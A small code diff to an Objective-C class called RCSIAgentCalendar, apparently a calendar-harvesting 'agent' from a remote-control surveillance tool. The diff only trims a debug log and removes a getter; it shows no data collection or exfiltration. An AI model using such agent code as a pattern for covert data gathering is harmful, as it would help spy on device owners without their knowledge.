@@ -415,15 +415,8 @@ NSDate *gStartDate, *gEndDate;
       for (int i=0; i<20; i++) 
         {
           sleep(1);
-
-          // Check for agent stopped
           if ([mAgentConfiguration objectForKey: @"status"] == AGENT_STOP)
-            {
-#ifdef DEBUG_CAL
-              NSLog(@"start: Organizer Agent stop notification received");
-#endif
-              break;
-            }
+            break;
         }
 
       [innerPool release];
@@ -467,11 +460,6 @@ NSDate *gStartDate, *gEndDate;
 #pragma mark -
 #pragma mark Getter/Setter
 #pragma mark -
-
-- (NSMutableDictionary *)mAgentConfiguration
-{
-  return mAgentConfiguration;
-}
 
 + (RCSIAgentCalendar *)sharedInstance
 {
